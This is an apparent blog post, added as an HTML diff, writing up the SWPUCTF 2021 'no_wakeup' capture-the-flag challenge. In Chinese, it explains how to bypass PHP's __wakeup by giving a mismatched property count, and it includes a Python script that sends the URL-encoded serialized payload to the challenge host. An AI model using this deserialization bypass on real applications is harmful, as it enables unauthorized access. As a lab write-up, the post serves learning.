@@ -1,0 +1,27 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</title>
+</head>
+<body>
+<b>从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</b><br>
+<small>2025-04-27</small>
+<hr>
+<p>PHP反序列化函数 考察的主要是绕过_wakeup 当序列化字符串的属性个数和括号内不符就绕过了</p>
+<pre><code>import requests 
+
+import json
+
+param = &quot;O%3A6%3A%22HaHaHa%22%3A3%3B%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A4%3A%22wllm%22%3B%7D&quot;
+
+url = f&quot;http://node7.anna.nssctf.cn:23157/class.php?p=&#123;param&#125;&quot;
+
+resp = requests.get(url=url)
+
+print(resp.text)</code></pre>
+
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
